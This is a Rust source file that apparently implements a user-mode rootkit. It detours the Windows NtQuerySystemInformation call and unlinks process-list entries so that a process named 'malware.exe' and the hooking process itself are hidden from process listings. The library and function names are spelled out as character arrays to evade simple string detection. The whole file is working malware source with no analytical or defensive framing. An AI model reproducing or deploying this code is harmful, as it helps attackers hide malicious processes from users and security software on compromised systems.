use std::error::Error;
use std::mem;
use winapi::shared::minwindef::ULONG;
use winapi::shared::ntdef::{HANDLE, NTSTATUS, PVOID, UNICODE_STRING};
use winapi::shared::basetsd::{SIZE_T, ULONG_PTR};
use std::slice;
use std::ptr::null_mut;

// Define function signature for NtQuerySystemInformation
type NtQuerySystemInformationFn = unsafe extern "system" fn(
    SystemInformationClass: u32,
    SystemInformation: PVOID,
    SystemInformationLength: ULONG,
    ReturnLength: *mut ULONG,
) -> NTSTATUS;

// Manual static storage for the hook (avoids macro issues)
static mut HOOK: Option<retour::GenericDetour<NtQuerySystemInformationFn>> = None;

// SystemProcessInformation = 5
const SYSTEMS_PROCESS_INFORMATION: u32 = 5;

// Structure for SYSTEM_PROCESS_INFORMATION (simplified)
#[repr(C)]
struct SYSTEM_PROCESS_INFORMATION {
    NextEntryOffset: ULONG,
    NumberOfThreads: ULONG,
    WorkingSetPrivateSize: i64, 
    HardFaultCount: ULONG,
    NumberOfThreadsHighWatermark: ULONG,
    CycleTime: u64,
    CreateTime: i64,
    UserTime: i64,
    KernelTime: i64,
    ImageName: UNICODE_STRING,
    BasePriority: i32,
    UniqueProcessId: HANDLE,
    InheritedFromUniqueProcessId: HANDLE,
    HandleCount: ULONG,
    SessionId: ULONG,
    UniqueProcessKey: ULONG_PTR,
    PeakVirtualSize: SIZE_T,
    VirtualSize: SIZE_T,
    PageFaultCount: ULONG,
    PeakWorkingSetSize: SIZE_T,
    WorkingSetSize: SIZE_T,
    QuotaPeakPagedPoolUsage: SIZE_T,
    QuotaPagedPoolUsage: SIZE_T,
    QuotaPeakNonPagedPoolUsage: SIZE_T,
    QuotaNonPagedPoolUsage: SIZE_T,
    PagefileUsage: SIZE_T,
    PeakPagefileUsage: SIZE_T,
    PrivatePageCount: SIZE_T,
    ReadOperationCount: i64,
    WriteOperationCount: i64,
    OtherOperationCount: i64,
    ReadTransferCount: i64,
    WriteTransferCount: i64,
    OtherTransferCount: i64,
}

/// Check if Image Name matches the target to hide
unsafe fn is_target_process(image_name: &UNICODE_STRING) -> bool {
    if image_name.Buffer.is_null() || image_name.Length == 0 {
        return false;
    }
    
    // Convert UTF-16 pointer to Slice for comparison
    let name_slice = slice::from_raw_parts(
        image_name.Buffer, 
        (image_name.Length / 2) as usize
    );

    // Target to hide: "malware.exe"
    let target_name = [
        'm' as u16, 'a' as u16, 'l' as u16, 'w' as u16, 
        'a' as u16, 'r' as u16, 'e' as u16, '.' as u16, 
        'e' as u16, 'x' as u16, 'e' as u16
    ];

    if name_slice.len() >= target_name.len() {
        return name_slice.windows(target_name.len()).any(|window| window == target_name);
    }
    
    false
}

pub fn install_hooks() -> Result<(), Box<dyn Error>> {
    unsafe {
        // "ntdll.dll"
        let dll_name = [
            'n' as u8, 't' as u8, 'd' as u8, 'l' as u8, 
            'l' as u8, '.' as u8, 'd' as u8, 'l' as u8, 
            'l' as u8, 0
        ];
        
        // "NtQuerySystemInformation"
        let func_name = [
            'N' as u8, 't' as u8, 'Q' as u8, 'u' as u8, 'e' as u8, 'r' as u8, 'y' as u8, 
            'S' as u8, 'y' as u8, 's' as u8, 't' as u8, 'e' as u8, 'm' as u8, 
            'I' as u8, 'n' as u8, 'f' as u8, 'o' as u8, 'r' as u8, 'm' as u8, 'a' as u8, 
            't' as u8, 'i' as u8, 'o' as u8, 'n' as u8, 0
        ];

        let ntdll = winapi::um::libloaderapi::GetModuleHandleA(dll_name.as_ptr() as *const i8);
        if ntdll.is_null() {
            return Err("Module not found".into());
        }

        let address = winapi::um::libloaderapi::GetProcAddress(
            ntdll,
            func_name.as_ptr() as *const i8,
        );
        if address.is_null() {
            return Err("Function not found".into());
        }

        let target: NtQuerySystemInformationFn = mem::transmute(address);

        // retour manual initialization
        let hook = retour::GenericDetour::new(target, nt_query_system_information_detour)?;
        hook.enable()?;
        
        // Store the hook in static mutable option
        HOOK = Some(hook);
    }
    Ok(())
}

fn get_current_process_id() -> u32 {
    unsafe { winapi::um::processthreadsapi::GetCurrentProcessId() }
}

unsafe extern "system" fn nt_query_system_information_detour(
    system_information_class: u32,
    system_information: PVOID,
    system_information_length: ULONG,
    return_length: *mut ULONG,
) -> NTSTATUS {
    // Call original function via the stored hook
    let original = match HOOK.as_ref() {
        Some(hook) => hook,
        None => return 0xC0000001u32 as NTSTATUS, // STATUS_UNSUCCESSFUL if hook gone
    };

    let status = original.call(
        system_information_class,
        system_information,
        system_information_length,
        return_length,
    );

    // Filter results if success and class is SystemProcessInformation
    if status == 0 && system_information_class == SYSTEMS_PROCESS_INFORMATION {
        let mut current_ptr = system_information as *mut SYSTEM_PROCESS_INFORMATION;
        let mut prev_ptr: *mut SYSTEM_PROCESS_INFORMATION = std::ptr::null_mut();

        loop {
            let current = &mut *current_ptr;
            
            let should_hide = is_target_process(&current.ImageName) 
                              || current.UniqueProcessId as usize == get_current_process_id() as usize;

            if should_hide {
                // UNLINK LOGIC (DKOM style in UserMode)
                if !prev_ptr.is_null() {
                    let prev = &mut *prev_ptr;
                    if current.NextEntryOffset == 0 {
                        prev.NextEntryOffset = 0;
                    } else {
                        prev.NextEntryOffset += current.NextEntryOffset;
                    }
                } else {
                    current.ImageName.Length = 0;
                    current.UniqueProcessId = null_mut();
                }
            } else {
                prev_ptr = current_ptr;
            }

            if current.NextEntryOffset == 0 {
                break;
            }
            current_ptr = (current_ptr as *mut u8).add(current.NextEntryOffset as usize) as *mut SYSTEM_PROCESS_INFORMATION;
        }
    }

    status
}
